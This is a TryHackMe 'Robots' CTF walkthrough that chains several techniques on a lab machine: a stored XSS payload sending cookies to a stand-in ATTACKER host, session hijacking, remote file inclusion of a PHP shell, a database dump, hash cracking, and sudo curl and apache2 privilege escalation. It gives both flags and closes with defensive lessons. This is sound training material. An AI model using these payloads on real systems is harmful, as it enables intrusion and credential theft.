# Robots — TryHackMe Walkthrough

**Room:** https://tryhackme.com/room/robots
**Difficulty:** Medium
**Flags:** User + Root

---

## Attack Chain

```
Recon → robots.txt → Hidden web app → Stored XSS → phpinfo() leak
→ Session hijack → RFI → RCE → DB dump → Hash crack → SSH
→ sudo curl privesc → SSH key injection → sudo apache2 privesc → root flag
```

---

## 1. Recon

```bash
nmap -sV -sC 10.130.176.35
# 22 (SSH OpenSSH 8.9p1), 80 (Apache 2.4.61)
```

## 2. robots.txt Discovery

```bash
curl http://10.130.176.35/robots.txt
# /harming/humans
# /ignoring/human/orders
# /harm/to/self
```

The `/harm/to/self/` directory contains a registration/login web app.

## 3. Stored XSS → phpinfo() Exfiltration

Password scheme: `md5(username + ddmm)` for login, `md5(md5(username + ddmm))` for storage.

Register a user with a script tag as the username to trigger XSS when the admin bot visits:

```bash
# Register XSS payload user
curl -X POST 'http://10.130.176.35/harm/to/self/register.php' \
  -d 'username=<script>fetch("http://ATTACKER:5555/?c="+document.cookie+"&d="+btoa(document.body.innerHTML))</script>&password=0101'

# Start exfil listener
python3 -c "
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.path, file=sys.stderr, flush=True)
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0',5555),H).serve_forever()
"
```

The admin bot visits the page, executing the script. The `phpinfo()` page at `server_info.php` contains the PHPSESSID in `HTTP_COOKIE` (bypasses HttpOnly).

## 4. Session Hijack

```bash
# Use stolen PHPSESSID
curl -b 'PHPSESSID=rkaidl76og5aucvbgi7pcptpeb' http://10.130.176.35/harm/to/self/admin.php
```

## 5. RFI → RCE

`admin.php` has a "Test URL" feature using `include()`. With `allow_url_include=On`:

```bash
# Host PHP shell
echo '<?php echo system("id"); ?>' > /tmp/id.php
python3 -m http.server 80

# Trigger RFI (use background curl due to PHP session locking)
curl -b 'PHPSESSID=rkaidl76og5aucvbgi7pcptpeb' \
  'http://10.130.176.35/harm/to/self/admin.php' \
  -d 'url=http://ATTACKER:80/id.php' --max-time 120 &
```

## 6. Database Dump

```bash
# RFI payload to dump MySQL
echo '<?php
$db = new PDO("mysql:host=db;dbname=web","robots","q4qCz1OflKvKwK4S");
$rows = $db->query("SELECT * FROM users");
foreach($rows as $r) echo implode("|",$r)."\n";
?>' > /tmp/dumpdb.php
```

Credentials: `servername=db, username=robots, password=q4qCz1OflKvKwK4S, dbname=web`

## 7. Hash Crack

rgiskard hash: `dfb35334bf2a1338fa40e5fbb4ae4753` = `md5(md5("rgiskard2209"))`

Login password (single md5): `b246f21ff68cae9503ed6d18edd32dae`

## 8. SSH as rgiskard

```bash
ssh rgiskard@10.130.176.35
# password: b246f21ff68cae9503ed6d18edd32dae
```

## 9. Privilege Escalation: sudo curl → dolivaw

```bash
sudo -l
# (dolivaw) /usr/bin/curl 127.0.0.1/*

# Host SSH public key via local HTTP server
echo 'ssh-rsa AAAA... attacker@kali' > /tmp/key
python3 -m http.server 8888 --directory /tmp

# Use --connect-to to redirect 127.0.0.1:80 → 127.0.0.1:8888
# (sudoers allows flags after the URL via the * glob)
sudo -u dolivaw /usr/bin/curl http://127.0.0.1/key --connect-to 127.0.0.1:80:127.0.0.1:8888 --output /home/dolivaw/.ssh/authorized_keys
```

## 10. SSH as dolivaw → sudo apache2

```bash
ssh dolivaw@10.130.176.35 -i /tmp/dolivaw_key

sudo -l
# (root) NOPASSWD: /usr/sbin/apache2

# Apache2 Include directive leaks root-owned files via syntax error
sudo /usr/sbin/apache2 -C 'Include /root/root.txt' -k stop
# Syntax error on line 1 of /root/root.txt:
# THM{2a279561f5eea907f7617df3982cee24}
```

---

## Flags

| Flag      | Value                                  |
| --------- | -------------------------------------- |
| User flag | `THM{9b17d3c3e86c944c868c57b5a7fa07d8}` |
| Root flag | `THM{2a279561f5eea907f7617df3982cee24}` |

---

## Vulnerabilities

| # | Vulnerability | Classification | Where |
|---|---|---|---|
| 1 | Stored Cross-Site Scripting (XSS) | CWE-79 / OWASP A03:2021 | Username field — no sanitization, rendered in index page |
| 2 | Sensitive Information Exposure via phpinfo() | CWE-200 / OWASP A01:2021 | `server_info.php` exposes cookies, paths, config |
| 3 | Session Hijacking (predictable/stolen session ID) | CWE-613 / OWASP A07:2021 | PHPSESSID exfiltrated from phpinfo HTTP_COOKIE |
| 4 | Remote File Inclusion (RFI) | CWE-98 / OWASP A08:2021 | `admin.php` `include()` + `allow_url_include=On` |
| 5 | Weak Password Hashing (double MD5, no salt) | CWE-916 / OWASP A02:2021 | `md5(md5(username+ddmm))` — trivially crackable |
| 6 | Improper sudoers Configuration (curl) | CWE-153 / MITRE T1548 | `sudoers` allows curl flags after URL via `*` glob |
| 7 | Improper sudoers Configuration (apache2) | CWE-153 / MITRE T1548 | NOPASSWD apache2 can read arbitrary files via Include |
| 8 | Information Disclosure via robots.txt | CWE-541 / OWASP A01:2021 | Sensitive paths exposed in robots.txt |
| 9 | Input Validation Bypass (sudo curl --connect-to) | CWE-20 | `--connect-to` flag bypasses host restriction |

---

## Lessons Learned

1. **Never trust user input in rendered output** — the username field accepted raw `<script>` tags. Always HTML-encode output and use Content Security Policy headers.

2. **phpinfo() must not be on production servers** — it leaks session IDs, internal paths, and server config. Remove it or restrict access with IP allowlists.

3. **HttpOnly cookies don't protect against server-side leaks** — the HttpOnly flag stops client-side JS from reading `document.cookie`, but phpinfo exposes the raw `HTTP_COOKIE` header server-side. Defense in depth matters.

4. **Never use MD5 for password hashing** — even double-hashing `md5(md5())` with no salt is trivially reversible. Use bcrypt, argon2, or scrypt.

5. **sudoers wildcards are dangerous** — the `*` glob in `(dolivaw) /usr/bin/curl 127.0.0.1/*` allows any flags after the URL, enabling `--connect-to` and `--output` for file writes. Always use explicit command arguments or denylists.

6. **Apache2 as sudo is a file reader** — any user with `sudo apache2` can include arbitrary files and read contents via syntax errors. Restrict sudo to only what's needed, and prefer systemd service management over direct binary execution.

7. **robots.txt is not security** — it's a polite request, not access control. Sensitive paths should require authentication, not just be hidden from crawlers.

8. **Chain attacks multiply impact** — each vulnerability alone (XSS, phpinfo, RFI, weak hashing, sudo misconfiguration) was limited. Chained together, they gave full root access. Fix every link, not just the obvious one.

---

## Key Techniques

- **Stored XSS** — script tag in username field, admin bot triggers it
- **phpinfo() cookie leak** — HTTP_COOKIE header bypasses HttpOnly flag
- **RFI via include()** — `allow_url_include=On` + admin URL test feature
- **Double MD5** — storage uses `md5(md5())`, login uses single `md5()`
- **sudo curl --connect-to** — bypass URL restriction `127.0.0.1/*` by redirecting ports
- **Apache2 Include** — GTFOBins technique: `-C 'Include /root/root.txt'` leaks file via syntax error